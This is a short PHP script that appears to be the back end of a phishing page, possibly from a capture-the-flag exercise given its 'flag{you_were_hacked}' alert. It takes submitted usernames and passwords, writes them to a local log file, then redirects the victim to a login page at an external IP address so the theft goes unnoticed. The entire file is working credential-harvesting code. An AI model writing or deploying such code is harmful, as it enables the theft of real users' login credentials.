<?php

$username = $_REQUEST['name'];
$password = $_REQUEST['password'];

$log = fopen("save/0w1_lalala.txt", "a");
fwrite($log, $username ."  ".$password. "\r\n");
fclose($log);

echo "<script>alert('flag{you_were_hacked}')</script>";
echo '<script language="javascript">';
echo "location.href='http://106.13.95.208/login'";
echo '</script>';

?>
